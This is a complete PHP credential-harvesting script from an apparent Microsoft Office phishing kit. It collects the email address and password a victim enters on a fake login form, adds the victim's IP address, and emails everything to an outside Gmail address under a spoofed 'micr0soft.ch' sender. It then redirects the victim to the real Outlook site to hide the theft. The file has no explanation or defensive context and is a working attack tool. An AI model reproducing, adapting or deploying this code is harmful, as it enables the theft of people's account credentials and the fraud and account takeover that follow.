<?   

$ip = getenv("REMOTE_ADDR");
$message .= ".................................... MineHulk Don't Forget Me\n";
$message .= "-------------------------------\n";
$message .= "Email Address : ".$_POST['login']."\n";
$message .= "Password : ".$_POST['passwd']."\n";
$message .= "IP : ".$ip."\n";
$message .= "-------------------------------\n";
$message .= ".................................... MineHulk Say GoodLuck\n";
$send = "tammiesippey691@gmail.com";
$subject = "oFFice ReZulT $ip";
$headers = "From: 0ffice<logs@micr0soft.ch>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send", "$subject", $message, $headers); 
header("Location: https://outlook.office.com");
	  

?>